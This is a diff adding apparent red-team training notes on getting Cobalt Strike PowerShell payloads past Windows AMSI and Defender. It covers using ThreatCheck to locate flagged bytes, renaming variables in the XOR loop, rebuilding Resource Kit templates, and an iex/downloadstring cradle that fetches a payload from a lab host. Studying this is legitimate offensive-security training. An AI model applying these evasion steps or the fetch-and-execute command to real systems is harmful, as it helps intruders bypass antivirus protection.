@@ -162,7 +162,47 @@ The signature(s) target the reflective loader or the Beacon DLL. The Beacon sour
 
 ## Resource Kit
 
-The Antimalware Scan Interface (AMSI) is a component of Windows which allows applications to integrate themselves with an antivirus engine by providing a consumable, language agnostic interface.  It was designed to tackle "fileless" malware that was so heavily popularised by tools like the EmpireProject, which leveraged PowerShell for complete in-memory C2.
+The Antimalware Scan Interface (AMSI) allows applications to integrate themselves with an antivirus engine. It was designed to tackle "fileless" malware that was so heavily popularised by tools like the [EmpireProject](https://github.com/EmpireProject/Empire) (used PS to get an in-memory C2). Any app can use AMSI to scan user input for malicious content. Many components now use AMSI including PowerShell, the Windows Script Host, JavaScript, VBScript, and VBA. Using one of the PS payloads on our attacker it will get blocked:
 
+    PS C:\Users\Attacker> C:\Payloads\smb_x64.ps1
+    At C:\Payloads\smb_x64.ps1:1 char:1
+    + Set-StrictMode -Version 2
+    + ~~~~~~~~~~~~~~~~~~~~~~~~~
+    This script contains malicious content and has been blocked by your antivirus software.
 
+Defender shows the malware was in memory by tagging Resources with amsi: rather than file:.
 
+Detections are still based on "known bad" signatures. PS files are a little easier to analyse compared to binary files; scanning with ThreatCheck and the -e amsi parameter shows bad strings.
+    
+    PS C:\Users\Attacker> ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
+    [+] Target file size: 358025 bytes
+    [+] Analyzing...
+    [!] Identified end of bad bytes at offset 0x57450
+
+Enable real-time protection in Defender before running ThreatCheck against script artifacts.
+
+Pay attention to the loop on lines 26-28 of smb_x64.ps1:
+
+    for ($x = 0; $x -lt $var_code.Count; $x++) {
+    	$var_code[$x] = $var_code[$x] -bxor 35
+    }
+
+As a quick test  change the $x and $var_code variable names to something else, and ThreatCheck now reports the payload as clean.
+
+To make this change permanent across all the PowerShell payloads, modify the relevant template in the Resource Kit. Where the Artifact Kit was used to modify the binary artifacts, the Resource Kit is used to modify the script-based artifacts including the PowerShell, Python, HTA and VBA payloads. The Kit can be found in C:\Tools\cobaltstrike\arsenal-kit\kits\resource and the 64-bit stageless PowerShell payload is generated from template.x64.ps1. As before, use the included build script and specify an output directory, then load resources.cna into Cobalt Strike.
+
+    ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/k/resource> ./build.sh /mnt/c/Tools/cobaltstrike/resources
+    [Resource Kit] [+] Copy the resource files
+    [Resource Kit] [+] Generate the resources.cna from the template file.
+    [Resource Kit] [+] The resource kit files are saved in '/mnt/c/Tools/cobaltstrike/resources'
+
+PS payloads using the Scripted Web Delivery method will generally get caught when stageless PowerShell payloads do not:
+
+    PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a")
+    IEX : At line:1 char:1
+
+It uses the compress.ps1 template instead, which extracts the payload from a Gzip stream. AMSI will flag almost anything as malicious if it sees a binary file coming out of a Gzip stream. Re-work this template as well if need to use a compressed version. A workaround is to just host a stageless PS payload directly via Site Management > Host File.
+
+    PS C:\Users\Attacker> iex (new-object net.webclient).downloadstring("http://10.10.5.50/a2")
+
+## 
